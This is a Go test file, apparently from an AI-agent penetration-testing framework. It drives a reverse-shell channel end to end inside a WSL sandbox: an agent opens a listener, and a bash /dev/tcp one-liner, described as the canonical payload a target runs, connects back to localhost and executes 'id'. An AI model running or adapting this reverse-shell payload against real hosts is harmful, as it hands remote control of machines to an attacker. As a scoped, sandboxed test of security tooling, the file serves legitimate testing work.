//go:build windows

package engine

import (
	"context"
	"io"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/nihaal-prasad/oline/internal/core"
	"github.com/nihaal-prasad/oline/internal/event"
	"github.com/nihaal-prasad/oline/internal/llm"
	"github.com/nihaal-prasad/oline/internal/sandbox"
	"github.com/nihaal-prasad/oline/internal/tools"
)

// TestLiveReverseShellRoundTrip drives a revshell channel end to end against real
// WSL: open a listener, connect a shell back to it from inside the sandbox, send a
// command, read its output, list, and close. This exercises the fragile listener
// scripting (netcat flags, the FIFO holder, the output log) and the send/read path
// on a real box. Gated on OLINE_TEST_WSL; reversible (teardown removes the oline
// users and rules). Benign: the only command sent is `id`. Needs netcat and bash
// /dev/tcp in the distro (Kali has both).
func TestLiveReverseShellRoundTrip(t *testing.T) {
	distro := os.Getenv("OLINE_TEST_WSL")
	if distro == "" {
		t.Skip("OLINE_TEST_WSL not set; skipping live reverse-shell test")
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	h, err := sandbox.NewWSL().Open(ctx, distro)
	if err != nil {
		t.Fatal(err)
	}
	if err := h.SetupEgress(ctx, sandbox.Scope{Targets: []string{"127.0.0.1/32"}}); err != nil {
		t.Fatalf("SetupEgress: %v", err)
	}
	defer func() { _ = sandbox.TeardownWSLEgress(distro) }()
	const ws = "/opt/oline/engagements/livetest"
	if setter, ok := h.(sandbox.WorkspaceSetter); ok {
		if err := setter.SetWorkspace(ctx, ws); err != nil {
			t.Fatalf("SetWorkspace: %v", err)
		}
	}

	events := make(chan event.Event, 256)
	go func() {
		for range events {
		}
	}()
	s := NewSession(tools.NewRegistry(), h, nil, func(string) (AgentConfig, bool) { return AgentConfig{}, false }, events, 5)
	s.Workspace = ws
	s.baseCtx = ctx
	a := newAgent("recon#1", AgentConfig{Role: "recon", Tools: []string{"bash", "revshell"}, Policy: sandbox.InScopeOnly}, nil, "m", s, "", "")
	s.router.register(a)

	rev := func(args string) (string, bool) {
		return a.doRevshell(llm.ToolCall{Arguments: args})
	}
	waitFor := func(d time.Duration, cond func() bool, msg string) {
		t.Helper()
		deadline := time.Now().Add(d)
		for time.Now().Before(deadline) {
			if cond() {
				return
			}
			time.Sleep(300 * time.Millisecond)
		}
		t.Fatal(msg)
	}

	if out, isErr := rev(`{"action":"open","name":"t","port":48123}`); isErr {
		t.Fatalf("open: %s", out)
	}
	defer rev(`{"action":"close","name":"t"}`)

	waitFor(10*time.Second, func() bool {
		o, _ := rev(`{"action":"read","name":"t"}`)
		return strings.Contains(o, "listening on port 48123")
	}, "listener did not come up")

	// Connect a real reverse shell back to the listener from inside the sandbox: an
	// interactive bash wired to the socket (the canonical payload a target runs). It
	// reads commands the channel sends and writes their output back.
	client := `exec 3<>/dev/tcp/127.0.0.1/48123; printf 'CONNECTED\n' >&3; exec /bin/bash -i <&3 >&3 2>&3`
	go func() {
		_, _ = h.Exec(ctx, core.AgentID("client"), sandbox.Cmd{Argv: []string{"bash", "-lc", client}, Policy: sandbox.Privileged}, io.Discard)
	}()

	waitFor(10*time.Second, func() bool {
		o, _ := rev(`{"action":"read","name":"t","bytes":65536}`)
		return strings.Contains(o, "CONNECTED")
	}, "reverse shell did not connect back")

	// Send `id` and confirm the shell's output comes back on the channel.
	sendOut, isErr := rev(`{"action":"send","name":"t","data":"id"}`)
	if isErr {
		t.Fatalf("send: %s", sendOut)
	}
	if !strings.Contains(sendOut, "uid=") {
		waitFor(5*time.Second, func() bool {
			o, _ := rev(`{"action":"read","name":"t","bytes":65536}`)
			return strings.Contains(o, "uid=")
		}, "sent 'id' but no uid= appeared on the channel (send="+sendOut+")")
	}

	if ls, _ := rev(`{"action":"list"}`); !strings.Contains(ls, "48123") {
		t.Errorf("list missing the open channel: %q", ls)
	}
	if _, isErr := rev(`{"action":"close","name":"t"}`); isErr {
		t.Error("close failed")
	}
	if s.getChannel("t") != nil {
		t.Error("channel still present after close")
	}
}
